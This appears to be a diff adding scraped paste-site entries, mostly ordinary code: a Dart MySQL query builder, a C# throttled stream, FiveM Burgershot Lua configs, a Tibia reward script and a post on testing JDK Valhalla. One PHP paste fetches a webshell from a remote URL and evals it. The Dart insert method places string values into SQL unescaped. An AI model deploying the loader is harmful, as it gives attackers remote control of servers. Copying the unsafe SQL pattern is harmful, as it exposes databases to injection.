+    if (type == MySqlCommandType.update) {
+      String parameterPlaceholder = '@$column';
+      if (_comma()) {
+        _command.write(', `$column` = $parameterPlaceholder ');
+      } else {
+        _command.write('`$column` = $parameterPlaceholder ');
+      }
+      addParameter(parameterPlaceholder, value);
+    }
+    return this;
+  }
+
+  MySqlCommand insert(String table) {
+    _command = StringBuffer(_command.toString().replaceAll('<R>', '`$table`'));
+    return this;
+  }
+
+  MySqlCommand insertField(String field, Object value) {
+    insertFields[lastpair] = '`$field`';
+    insertValues[lastpair] = value is String ? ""'$value'"" : value.toString();
+    addParameter('@$field', value);
+    lastpair++;
+    return this;
+  }
+
+  MySqlCommand addParameter(String name, Object value) {
+    _parameters.add(MySqlParameter(name, value));
+    return this;
+  }
+
+  MySqlCommand where(String column, Object value, {bool greater = false, bool like = false}) {
+    String parameterPlaceholder = '@$column';
+    if (like) {
+      _command.write(' WHERE `$column` LIKE $parameterPlaceholder');
+      addParameter(parameterPlaceholder, '%$value%');
+    } else {
+      _command.write(' WHERE `$column` ${greater ? '>' : '='} $parameterPlaceholder');
+      addParameter(parameterPlaceholder, value);
+    }
+    return this;
+  }
+
+  Future<int> execute(MySqlConnection conn) async {
+    if (type == MySqlCommandType.insert) {
+      var fields = insertFields.values.join(',');
+      var values = insertValues.values.join(',');
+      _command = StringBuffer(_command.toString().replaceAll('<F>', fields).replaceAll('<V>', values));
+    }
+    var result = await conn.query(_command.toString(), _parameters.map((param) => param.value).toList());
+    return result.affectedRows;
+  }
+
+  Future<Results> query(MySqlConnection conn) async {
+    var result = await conn.query(_command.toString(), _parameters.map((param) => param.value).toList());
+    return result;
+  }
+}
+
+class MySqlParameter {
+  String name;
+  Object value;
+  MySqlParameter(this.name, this.value);
+}
+
+Future<MySqlConnection> getConnection() async {
+  final settings = ConnectionSettings(
+    host: 'localhost',
+    port: 3306,
+    user: 'yourUsername',
+    password: 'yourPassword',
+    db: 'yourDatabase',
+  );
+  return await MySqlConnection.connect(settings);
+}
+"
+sTxUA5nH,Throttle Stream,ivandrofly,C#,Monday 24th of June 2024 11:46:41 AM CDT,"using System;
+using System.IO;
+using System.Threading;
+using System.Diagnostics;
+
+namespace Born2Code.Net
+{
+    /// <summary>
+    /// Class for streaming data with throttling support.
+    /// </summary>
+    public class ThrottledStream : Stream
+    {
+        /// <summary>
+        /// A constant used to specify an infinite number of bytes that can be transferred per second.
+        /// </summary>
+        public const long Infinite = 0;
+
+        #region Private members
+        /// <summary>
+        /// The base stream.
+        /// </summary>
+        private Stream _baseStream;
+
+        /// <summary>
+        /// The maximum bytes per second that can be transferred through the base stream.
+        /// </summary>
+        private long _maximumBytesPerSecond;
+
+        /// <summary>
+        /// The number of bytes that has been transferred since the last throttle.
+        /// </summary>
+        private long _byteCount;
+
+        /// <summary>
+        /// The start time in milliseconds of the last throttle.
+        /// </summary>
+        private long _start;
+        #endregion
+
+        #region Properties
+        /// <summary>
+        /// Gets the current milliseconds.
+        /// </summary>
+        /// <value>The current milliseconds.</value>
+        protected long CurrentMilliseconds
+        {
+            get
+            {
+                return Environment.TickCount;
+            }
+        }
+
+        /// <summary>
+        /// Gets or sets the maximum bytes per second that can be transferred through the base stream.
+        /// </summary>
+        /// <value>The maximum bytes per second.</value>
+        public long MaximumBytesPerSecond
+        {
+            get
+            {
+                return _maximumBytesPerSecond;
+            }
+            set
+            {
+                if (MaximumBytesPerSecond != value)
+                {
+                    _maximumBytesPerSecond = value;
+                    Reset();
+                }
+            }
+        }
+
+        /// <summary>
+        /// Gets a value indicating whether the current stream supports reading.
+        /// </summary>
+        /// <returns>true if the stream supports reading; otherwise, false.</returns>
+        public override bool CanRead
+        {
+            get
+            {
+                return _baseStream.CanRead;
+            }
+        }
+
+        /// <summary>
+        /// Gets a value indicating whether the current stream supports seeking.
+        /// </summary>
+        /// <value></value>
+        /// <returns>true if the stream supports seeking; otherwise, false.</returns>
+        public override bool CanSeek
+        {
+            get
+            {
+                return _baseStream.CanSeek;
+            }
+        }
+
+        /// <summary>
+        /// Gets a value indicating whether the current stream supports writing.
+        /// </summary>
+        /// <value></value>
+        /// <returns>true if the stream supports writing; otherwise, false.</returns>
+        public override bool CanWrite
+        {
+            get
+            {
+                return _baseStream.CanWrite;
+            }
+        }
+
+        /// <summary>
+        /// Gets the length in bytes of the stream.
+        /// </summary>
+        /// <value></value>
+        /// <returns>A long value representing the length of the stream in bytes.</returns>
+        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support seeking. </exception>
+        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
+        public override long Length
+        {
+            get
+            {
+                return _baseStream.Length;
+            }
+        }
+
+        /// <summary>
+        /// Gets or sets the position within the current stream.
+        /// </summary>
+        /// <value></value>
+        /// <returns>The current position within the stream.</returns>
+        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs. </exception>
+        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support seeking. </exception>
+        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
+        public override long Position
+        {
+            get
+            {
+                return _baseStream.Position;
+            }
+            set
+            {
+                _baseStream.Position = value;
+            }
+        }
+        #endregion
+
+        #region Ctor
+        /// <summary>
+        /// Initializes a new instance of the <see cref=""T:ThrottledStream""/> class with an
+        /// infinite amount of bytes that can be processed.
+        /// </summary>
+        /// <param name=""baseStream"">The base stream.</param>
+        public ThrottledStream(Stream baseStream)
+            : this(baseStream, ThrottledStream.Infinite)
+        {
+            // Nothing todo.
+        }
+
+        /// <summary>
+        /// Initializes a new instance of the <see cref=""T:ThrottledStream""/> class.
+        /// </summary>
+        /// <param name=""baseStream"">The base stream.</param>
+        /// <param name=""maximumBytesPerSecond"">The maximum bytes per second that can be transferred through the base stream.</param>
+        /// <exception cref=""ArgumentNullException"">Thrown when <see cref=""baseStream""/> is a null reference.</exception>
+        /// <exception cref=""ArgumentOutOfRangeException"">Thrown when <see cref=""maximumBytesPerSecond""/> is a negative value.</exception>
+        public ThrottledStream(Stream baseStream, long maximumBytesPerSecond)
+        {
+            if (baseStream == null)
+            {
+                throw new ArgumentNullException(""baseStream"");
+            }
+
+            if (maximumBytesPerSecond < 0)
+            {
+                throw new ArgumentOutOfRangeException(""maximumBytesPerSecond"",
+                    maximumBytesPerSecond, ""The maximum number of bytes per second can't be negatie."");
+            }
+
+            _baseStream = baseStream;
+            _maximumBytesPerSecond = maximumBytesPerSecond;
+            _start = CurrentMilliseconds;
+            _byteCount = 0;
+        }
+        #endregion
+
+        #region Public methods
+        /// <summary>
+        /// Clears all buffers for this stream and causes any buffered data to be written to the underlying device.
+        /// </summary>
+        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs.</exception>
+        public override void Flush()
+        {
+            _baseStream.Flush();
+        }
+
+        /// <summary>
+        /// Reads a sequence of bytes from the current stream and advances the position within the stream by the number of bytes read.
+        /// </summary>
+        /// <param name=""buffer"">An array of bytes. When this method returns, the buffer contains the specified byte array with the values between offset and (offset + count - 1) replaced by the bytes read from the current source.</param>
+        /// <param name=""offset"">The zero-based byte offset in buffer at which to begin storing the data read from the current stream.</param>
+        /// <param name=""count"">The maximum number of bytes to be read from the current stream.</param>
+        /// <returns>
+        /// The total number of bytes read into the buffer. This can be less than the number of bytes requested if that many bytes are not currently available, or zero (0) if the end of the stream has been reached.
+        /// </returns>
+        /// <exception cref=""T:System.ArgumentException"">The sum of offset and count is larger than the buffer length. </exception>
+        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
+        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support reading. </exception>
+        /// <exception cref=""T:System.ArgumentNullException"">buffer is null. </exception>
+        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs. </exception>
+        /// <exception cref=""T:System.ArgumentOutOfRangeException"">offset or count is negative. </exception>
+        public override int Read(byte[] buffer, int offset, int count)
+        {
+            Throttle(count);
+
+            return _baseStream.Read(buffer, offset, count);
+        }
+
+        /// <summary>
+        /// Sets the position within the current stream.
+        /// </summary>
+        /// <param name=""offset"">A byte offset relative to the origin parameter.</param>
+        /// <param name=""origin"">A value of type <see cref=""T:System.IO.SeekOrigin""></see> indicating the reference point used to obtain the new position.</param>
+        /// <returns>
+        /// The new position within the current stream.
+        /// </returns>
+        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs. </exception>
+        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support seeking, such as if the stream is constructed from a pipe or console output. </exception>
+        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
+        public override long Seek(long offset, SeekOrigin origin)
+        {
+            return _baseStream.Seek(offset, origin);
+        }
+
+        /// <summary>
+        /// Sets the length of the current stream.
+        /// </summary>
+        /// <param name=""value"">The desired length of the current stream in bytes.</param>
+        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support both writing and seeking, such as if the stream is constructed from a pipe or console output. </exception>
+        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs. </exception>
+        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
+        public override void SetLength(long value)
+        {
+            _baseStream.SetLength(value);
+        }
+
+        /// <summary>
+        /// Writes a sequence of bytes to the current stream and advances the current position within this stream by the number of bytes written.
+        /// </summary>
+        /// <param name=""buffer"">An array of bytes. This method copies count bytes from buffer to the current stream.</param>
+        /// <param name=""offset"">The zero-based byte offset in buffer at which to begin copying bytes to the current stream.</param>
+        /// <param name=""count"">The number of bytes to be written to the current stream.</param>
+        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs. </exception>
+        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support writing. </exception>
+        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
+        /// <exception cref=""T:System.ArgumentNullException"">buffer is null. </exception>
+        /// <exception cref=""T:System.ArgumentException"">The sum of offset and count is greater than the buffer length. </exception>
+        /// <exception cref=""T:System.ArgumentOutOfRangeException"">offset or count is negative. </exception>
+        public override void Write(byte[] buffer, int offset, int count)
+        {
+            Throttle(count);
+
+            _baseStream.Write(buffer, offset, count);
+        }
+
+        /// <summary>
+        /// Returns a <see cref=""T:System.String""></see> that represents the current <see cref=""T:System.Object""></see>.
+        /// </summary>
+        /// <returns>
+        /// A <see cref=""T:System.String""></see> that represents the current <see cref=""T:System.Object""></see>.
+        /// </returns>
+        public override string ToString()
+        {
+            return _baseStream.ToString();
+        }
+        #endregion
+
+        #region Protected methods
+        /// <summary>
+        /// Throttles for the specified buffer size in bytes.
+        /// </summary>
+        /// <param name=""bufferSizeInBytes"">The buffer size in bytes.</param>
+        protected void Throttle(int bufferSizeInBytes)
+        {
+			// Make sure the buffer isn't empty.
+            if (_maximumBytesPerSecond <= 0 || bufferSizeInBytes <= 0)
+            {
+                return;
+            }
+
+            _byteCount += bufferSizeInBytes;
+            long elapsedMilliseconds = CurrentMilliseconds - _start;
+
+            if (elapsedMilliseconds > 0)
+            {
+				// Calculate the current bps.
+                long bps = _byteCount * 1000L / elapsedMilliseconds;
+
+				// If the bps are more then the maximum bps, try to throttle.
+                if (bps > _maximumBytesPerSecond)
+                {
+                    // Calculate the time to sleep.
+                    long wakeElapsed = _byteCount * 1000L / _maximumBytesPerSecond;
+                    int toSleep = (int)(wakeElapsed - elapsedMilliseconds);
+
+                    if (toSleep > 1)
+                    {
+                        try
+                        {
+							// The time to sleep is more then a millisecond, so sleep.
+                            Thread.Sleep(toSleep);
+                        }
+                        catch (ThreadAbortException)
+                        {
+                            // Eatup ThreadAbortException.
+                        }
+
+                        // A sleep has been done, reset.
+                        Reset();
+                    }
+                }
+            }
+        }
+
+        /// <summary>
+        /// Will reset the bytecount to 0 and reset the start time to the current time.
+        /// </summary>
+        protected void Reset()
+        {
+            long difference = CurrentMilliseconds - _start;
+
+            // Only reset counters when a known history is available of more then 1 second.
+            if (difference > 1000)
+            {
+                _byteCount = 0;
+                _start = CurrentMilliseconds;
+            }
+        }
+        #endregion
+    }
+}
+
+Source: Born2Code.Net (Throttling)"
+DWzAwA84,TZMC Burgershot Doors,TZMC-FiveM,Lua,Monday 24th of June 2024 11:28:42 AM CDT,"---------------------
+-- TZMC Burgershot --
+---------------------
+
+-- entrance_parking
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	doors = {
+		{
+			objHash = 1724308471,
+			objYaw = 124.04663848877,
+			objCoords = vector3(-1183.373, -885.5644, 13.90346)
+		},
+		{
+			objHash = -571782594,
+			objYaw = 304.04663085938,
+			objCoords = vector3(-1184.716, -883.5756, 13.90346)
+		}
+	}
+},
+
+-- entrance_parking_employee
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 1009568243,
+	objCoords = vector3(-1176.609, -895.5757, 13.90446),
+	objHeading = 124.04663848877
+},
+
+-- entrance_street
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	doors = {
+		{
+			objHash = -571782594,
+			objYaw = 34.046661376953,
+			objCoords = vector3(-1198.777, -885.0333, 13.90346)
+		},
+		{
+			objHash = 1724308471,
+			objYaw = 214.04669189453,
+			objCoords = vector3(-1196.788, -883.6895, 13.90346)
+		}
+	}
+},
+
+-- entrance_drive_thru
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 1009568243,
+	objCoords = vector3(-1199.886, -903.0258, 13.90446),
+	objHeading = 304.04666137695
+},
+
+-- office
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 846116471,
+	objCoords = vector3(-1200.195, -901.2343, 13.90246),
+	objHeading = 34.046661376953
+},
+
+-- freezer
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 1309514423,
+	objCoords = vector3(-1193.738, -900.0775, 13.94934),
+	objHeading = 304.04663085938
+},
+
+-- drive_thru
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 547885802,
+	objCoords = vector3(-1191.715, -902.7607, 13.90246),
+	objHeading = 124.04666137695
+},
+
+-- drive_thru_window
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = -1905927556,
+	objCoords = vector3(-1194.544, -905.5848, 14.3733),
+	objHeading = 169.04664611816
+},
+
+-- kitchen_to_lockers
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 547885802,
+	objCoords = vector3(-1182.503, -899.5582, 13.90246),
+	objHeading = 124.04666137695
+},
+
+-- employee_toilet
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 846116471,
+	objCoords = vector3(-1183.268, -897.0563, 13.90246),
+	objHeading = 34.046661376953
+},
+
+-- kitchen_to_recep
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 1618088565,
+	objCoords = vector3(-1185.813, -895.4786, 13.90246),
+	objHeading = 214.04667663574
+},
+
+-- recep_to_store
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 1618088565,
+	objCoords = vector3(-1185.497, -894.5898, 13.90246),
+	objHeading = 124.04666137695
+},
+
+-- toilet_handicap
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 846116471,
+	objCoords = vector3(-1202.231, -892.0251, 13.90246),
+	objHeading = 34.046661376953
+},
+
+-- toilet_men_female
+{
+	authorizedJobs = { ['burgershot']=0 },
+	audioRemote = false,
+	slides = false,
+	garage = false,
+	fixText = false,
+	lockpick = false,
+	maxDistance = 2.0,
+	locked = true,
+	objHash = 846116471,
+	objCoords = vector3(-1201.331, -894.7256, 13.90246),
+	objHeading = 124.04666137695
+},
+"
+7pq8Ba4H,"I actually tested JDK 20 Valhalla, here are my findings",DulcetAirman,Java,Monday 24th of June 2024 11:17:09 AM CDT,"Somebody asked this two years ago, but it's archived now: https://www.reddit.com/r/java/comments/yfdofb/anyone_tested_jdk_20_early_access_build_for/
+For my tests I created a primitive version of a relatively simple data structure I once created for a sudoku solver (it was a project at uni):
+https://github.com/claudemartin/smallset/tree/valhalla
+It's a bit field that uses all 32 bits of an int. That means it can hold the values 0 to 31 (inclusive). ""SmallSet"" isn't a great name, but it is a set and it is ""small"" because it is limited to only 32 bits.   
+Here are my opinions:
+It's relatively easy to use. You really can just use the new keyword ""primitive"" to make any class primitive.
+It is stable. I tried the same with Java 14 Valhalla and back then it crashed when I let it run the unit tests in a loop. But now I didn't experience any such problems except for serialisation. 
+Since Eclipse doesn't support Valhalla I used ANT and a very simple batch script (I'm on Windows 11). Getting it to run on another system should be just as easy. 
+It's weird that you have to use new Foo() to create a primitive value (not a reference). We are used to using the ""new"" keyword to create a new reference, which means memory is allocated on the heap. But now ""new"" just means you call a constructor.
+You get an additional type for a boxed version. If you create a primitive class ""Foo"", you also get ""Foo.ref"". Autoboxing works fine. We might even get int.ref as an alias for java.lang.Integer, but that's not the case yet.
+Var-args and overloads can be tricky. If you have myMethod(Object... values) and you call it using your own primitive type ""Foo"", you get an Object[] containing only boxed values. You can also get a situation where you don't call the method you want when there are overloads and the compiler uses autoboxing. However, when I created myMethod(SmallSet... values)it didn't compile, because the compiler thinks it's ambiguous. But isn't the second one more specific? Same if you have m(Foo...) and m(Foo.ref[]). And often you have legacy code that has overloads for the existing primitives and everything else goes to a methods that accepts""Object"" or ""Object[]"". That still works in most cases but even if they don't allow overloads with arrays of value types, there will probably be some issues. You can still use getComponentType to check the type. But array.getClass().getComponentType().isPrimitive() will return false. You must use isValue / isIdentity instead.  
+Reflection is now a lot more complex and lots of frameworks will not work. So they added isValue and they also added Modifier.VALUE. But we use the keyword ""primitive"", not ""value"". This is extremely confusing. You create a primitive class and it's not primitive?! The modifier ""primitive"" is actually called ""value"" in reflection?! But then there's also ""PrimitiveClass.PRIMITIVE_CLASS"" and now I'm just confused. And isValue is true even if you use it on a Foo.ref type, which is auto-generated and used whenever a reference is required. But how would you know whether a Class<?> is the primitive type or a boxed version of it? There's isPrimitiveValueType, which isn't public. 
+And I found more issues with arrays. It's ok that you cant use null inside a SmallSet[]. But somehow I can assign a SmallSet[] to an Object[]. It's not new that you can completely break type safety in Java by assigning some array to some variable with an array type that has a more general component type. But the values inside that Array are actually values. Right now Java can't convert from int[] to Object[], but with Valhalla it can convert from SmallSet[] to Object[]. That makes no sense. But if this is really so it would explain the problem I had with the overloads.  
+We still need support for generic types, such as Stream, Optional, Comsumer, etc. It's great that primitives can't be null, but when you want to use Optional you'd have to use the boxed version. There is OptionalInt for integers, but there wouldn't be an Optional for your custom primitive, even if it only uses an int, like my SmallSet. Since we don't even have ByteStream or FloatStream, we might not get a Stream for any custom primitive type. The constant autoboxing will diminish the benefits of suing primitive types. This might come in a different release if they ever actually implement JEP 218. 
+Serialisation does not work at all. You can't write it to an ObjectOutputStream because there is no writePrimitive that would accept any custom value type. I created a simple record to hold the primitive value and it doesn't work. You can run the unit tests to reproduce the problem. It might be necessary to implement writeObject() and readObject() so that our custom primitives can be serialised. But I hope this will be fixed. 
+It is faster. More than twice as fast on my system and with my simple test. I created thousands of such ""small sets"" to add and remove random numbers and create the complement. On my machine this is about twice as fast. This isn't on the repo but all I had to do is copy the primitive class to a different package and remove the ""primitive"" and some of the methods that wouldn't compile. I used System.nanoTime() and I measured after a few warm up iteration. It was less than 50s vs more than 100s. I didn't measure memory usage as this would require better benchmarking. 
+After all that I still hope we soon get something similar to what we already have in this preview. 
+Serialisation has to be fixed as some frameworks use it and reflection could be a bit simpler. Arrays shouldn't be used in APIs anyway. The performance is actually much better and so it would be worth it. And I'm sure a lot of other languages that can run on the JVM, such as EcmaScript, Python, and Ruby, will also benefit from this. And IDEs will probably have lots of helpful tips on how to prevent autoboxing. "
+vYQhF3Ks,Untitled,Pasterbiner123321,Lua,Monday 24th of June 2024 11:11:37 AM CDT,"-- ten dziala
+
+local uniqueid = 10214
+local storage = 10214
+local storageTime = 43200 
+
+local items = {
+    {id = 2148, chance = 60, name = ""Gold Coin""},        -- very high chance
+    {id = 2152, chance = 25, name = ""Platinum Coin""},    -- normal chance
+    {id = 2160, chance = 10, name = ""Crystal Coin""},     -- low chance
+    {id = 6527, chance = 4, name = ""Server Token""},      -- very low chance
+    {id = 8299, chance = 1, name = ""Legendary Gem""}      -- ultra low chance
+}
+
+local function getRandomItem()
+    local rand = math.random(100)
+    local cumulativeChance = 0
+    for _, item in ipairs(items) do
+        cumulativeChance = cumulativeChance + item.chance
+        if rand <= cumulativeChance then
+            return item
+        end
+    end
+    return items[1] 
+end
+
+local function getFreePosition(usedPositions)
+    local arenaMin = Position(32253, 30741, 6)
+    local arenaMax = Position(32259, 30744, 6)
+    local position
+
+    repeat
+        position = Position(math.random(arenaMin.x, arenaMax.x), math.random(arenaMin.y, arenaMax.y), arenaMin.z)
+    until not usedPositions[position.x .. "","" .. position.y]
+
+    usedPositions[position.x .. "","" .. position.y] = true
+    return position
+end
+
+local function dropItem(player, fromPosition, luckyItems, usedPositions)
+    local selectedItem = getRandomItem()
+    local itemCount = math.random(1, 12)
+    local position = getFreePosition(usedPositions)
+    local droppedItem = Game.createItem(selectedItem.id, itemCount, position)
+    if droppedItem then
+        droppedItem:setActionId(5640)
+        position:sendMagicEffect(CONST_ME_MAGIC_GREEN)
+        fromPosition:sendDistanceEffect(position, CONST_ANI_SMALLICE)
+        table.insert(luckyItems, {id = selectedItem.id, name = selectedItem.name, count = itemCount, position = position})
+
+        position:sendMagicEffect(CONST_ME_TUTORIALARROW)
+
+        if (selectedItem.id == 6527 or selectedItem.id == 8299) and itemCount > 5 then
+            local itemType = (selectedItem.id == 6527) and ""Server Token"" or ""Legendary Gem""
+            local message = string.format(""%s has won %d %s from Compass Treasure!"", player:getName(), itemCount, itemType)
+            Game.broadcastMessage(message, TALKTYPE_BROADCAST)
+        end
+    end
+
+    return luckyItems
+end
+
+local function collectItems(playerId, luckyItems)
+    local player = Player(playerId)
+    if not player then
+        for _, item in ipairs(luckyItems) do
+            local position = item.position
+            local tile = Tile(position)
+            local droppedItem = tile and tile:getItemById(item.id)
+            if droppedItem then
+                droppedItem:remove()
+            end
+        end
+        return
+    end
+
+    for _, item in ipairs(luckyItems) do
+        local position = item.position
+        local tile = Tile(position)
+        local droppedItem = tile and tile:getItemById(item.id)
+        if droppedItem then
+            position:sendDistanceEffect(player:getPosition(), CONST_ANI_SMALLICE)
+            droppedItem:remove()
+            player:addItem(item.id, item.count)
+        end
+    end
+end
+
+local function dropItems(player, fromPosition, count)
+    local luckyItems = {}
+    local usedPositions = {}
+
+    local function dropNextItem(i)
+        if i <= count then
+            luckyItems = dropItem(player, fromPosition, luckyItems, usedPositions)
+            addEvent(dropNextItem, 500, i + 1)
+        else
+            if #luckyItems == 0 then
+                luckyItems = dropItem(player, fromPosition, luckyItems, usedPositions)
+            end
+
+            local luckMessage = ""You have received:\n""
+            for _, item in ipairs(luckyItems) do
+                luckMessage = luckMessage .. item.count .. ""x "" .. item.name .. ""\n""
+            end
+
+            if #luckyItems > 4 then
+                player:say(""Incredible luck!"", TALKTYPE_MONSTER_SAY)
+                player:sendTextMessage(MESSAGE_EVENT_ADVANCE, luckMessage)
+            elseif #luckyItems > 2 then
+                player:say(""Great luck!"", TALKTYPE_MONSTER_SAY)
+                player:sendTextMessage(MESSAGE_EVENT_ADVANCE, luckMessage)
+            else
+                player:say(""Better luck next time!"", TALKTYPE_MONSTER_SAY)
+                player:sendTextMessage(MESSAGE_EVENT_ADVANCE, luckMessage)
+            end
+
+            
+            fromPosition:sendMagicEffect(CONST_ME_EXPLOSIONAREA)
+
+            
+            addEvent(collectItems, 6000, player:getId(), luckyItems)
+        end
+    end
+
+    dropNextItem(1)
+end
+
+function onUse(player, item, fromPosition, target, toPosition, isHotkey)
+    
+    if player:getStorageValue(storage) > os.time() then
+        player:sendCancelMessage(""You have already used this item today. Try again later."")
+        return true
+    end
+
+    
+    player:setStorageValue(storage, os.time() + storageTime)
+
+    
+    dropItems(player, fromPosition, 5)
+
+    return true
+end
+"
+6tEF1MgD,TZMC Burgershot Job,TZMC-FiveM,Lua,Monday 24th of June 2024 11:06:59 AM CDT," ['burgershot'] = {
+        label = 'Burgershot',
+        defaultDuty = false,
+        offDutyPay = false,
+        grades = {
+            ['0'] = {
+                name = 'Junior Cook',
+                payment = 50
+            },
+            ['1'] = {
+                name = 'Cook',
+                payment = 100
+            },
+            ['2'] = {
+                name = 'Team Leader',
+                payment = 150
+            },
+            ['3'] = {
+                name = 'Manager',
+                isboss = true,
+                payment = 200
+            },
+        },
+    },
+"
+KcMZ6q8C,zz,blackhat1337,PHP,Monday 24th of June 2024 11:06:46 AM CDT,"session_start<?php
+$a = file_get_contents(https://raw.githubusercontent.com/exploit-haxor/webshell/main/mydb@.php');
+eval('?>'.$a);"
+fYZGWMFS,TZMC Burgershot Useable Items,TZMC-FiveM,Lua,Monday 24th of June 2024 11:05:02 AM CDT,"-- Hornys 
+ 
+QBCore.Functions.CreateUseableItem(""friesburgershot"", function(source, item)
+    local src = source
+    local Player = QBCore.Functions.GetPlayer(src)
+    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
+        TriggerClientEvent(""consumables:client:Eat"", src, item.name)
+    end
+end)
+ 
+QBCore.Functions.CreateUseableItem(""nuggetsburgershot"", function(source, item)
+    local src = source
+    local Player = QBCore.Functions.GetPlayer(src)
+    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
+        TriggerClientEvent(""consumables:client:Eat"", src, item.name)
+    end
+end)
+ 
+QBCore.Functions.CreateUseableItem(""bleeder"", function(source, item)
+    local src = source
+    local Player = QBCore.Functions.GetPlayer(src)
+    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
+        TriggerClientEvent(""consumables:client:Eat"", src, item.name)
+    end
+end)
+ 
+QBCore.Functions.CreateUseableItem(""heartstopper"", function(source, item)
+    local src = source
+    local Player = QBCore.Functions.GetPlayer(src)
+    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
+        TriggerClientEvent(""consumables:client:Eat"", src, item.name)
+    end
+end)
+ 
+QBCore.Functions.CreateUseableItem(""roosterbooster"", function(source, item)
+    local src = source
+    local Player = QBCore.Functions.GetPlayer(src)
+    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
+        TriggerClientEvent(""consumables:client:Eat"", src, item.name)
+    end
+end)
+ 
+QBCore.Functions.CreateUseableItem(""sprunk"", function(source, item)
+    local src = source
+    local Player = QBCore.Functions.GetPlayer(src)
+    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
+        TriggerClientEvent(""consumables:client:Drink"", src, item.name)
+    end
+end)
+ 
+QBCore.Functions.CreateUseableItem(""ecola"", function(source, item)
+    local src = source
+    local Player = QBCore.Functions.GetPlayer(src)
+    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
+        TriggerClientEvent(""consumables:client:Drink"", src, item.name)
+    end
+end)
+"
+ZvRsnvx0,TZMC Burgershot Items,TZMC-FiveM,Lua,Monday 24th of June 2024 10:56:07 AM CDT,"    -- Drinks
+	[""burgershotcup""]			 	= {[""name""] = ""burgershotcup"", 			        [""label""] = ""Empty Burgershot Cup"", 	[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""emptucupburgershot.png"", 	[""unique""] = false, 		[""useable""] = false, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""Fill this up with some juice.""},
+	[""sprunk""]			 		    = {[""name""] = ""sprunk"", 					    [""label""] = ""Sprunk"", 				    [""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""sprunk.png"", 			    [""unique""] = false, 		[""useable""] = true, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""The Essence of Life.""},
+	[""ecola""]			 		    = {[""name""] = ""ecola"", 						    [""label""] = ""Ecola"", 				    [""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""ecola.png"", 			    [""unique""] = false, 		[""useable""] = true, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""Deliciously infectious!""},
+
+    -- Consumables 
